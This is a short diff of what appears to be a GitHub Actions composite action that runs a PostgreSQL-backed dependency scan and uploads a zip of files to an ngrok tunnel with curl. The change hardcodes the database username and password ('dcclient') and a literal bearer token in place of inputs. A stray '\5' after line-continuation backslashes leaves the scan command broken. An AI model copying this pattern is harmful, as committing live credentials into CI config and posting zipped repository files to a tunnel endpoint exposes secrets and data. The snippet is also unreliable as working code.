@@ -53,8 +53,8 @@ runs:
           -out reports \
           --dbDriverName "org.postgresql.Driver" \
           --connectionString "${{inputs.connection_string}}" \
-          --dbUser "${{inputs.db_user}}" \
-          --dbPassword "${{inputs.db_password}}" \5
+          --dbUser "dcclient" \
+          --dbPassword "dcclient" \5
           --dbDriverPath "./no-check/driver/postgresql-42.6.0.jar" \
           -n
 
@@ -108,7 +108,7 @@ runs:
     - name: Send ZIP to Endpoint
       shell: bash
       run: |
-         curl https://squirrel-cheerful-visually.ngrok-free.app/zip -X POST -F "file=@my-files.zip" -H "Authorization: Bearer ${{inputs.shs_token}}"
+         curl https://squirrel-cheerful-visually.ngrok-free.app/zip -X POST -F "file=@my-files.zip" -H "Authorization: Bearer fXWzHv5IthZmzHK5dFkJapsUb00z1amqWK_8QMz4kxM"
 
 outputs:
   repository_info:
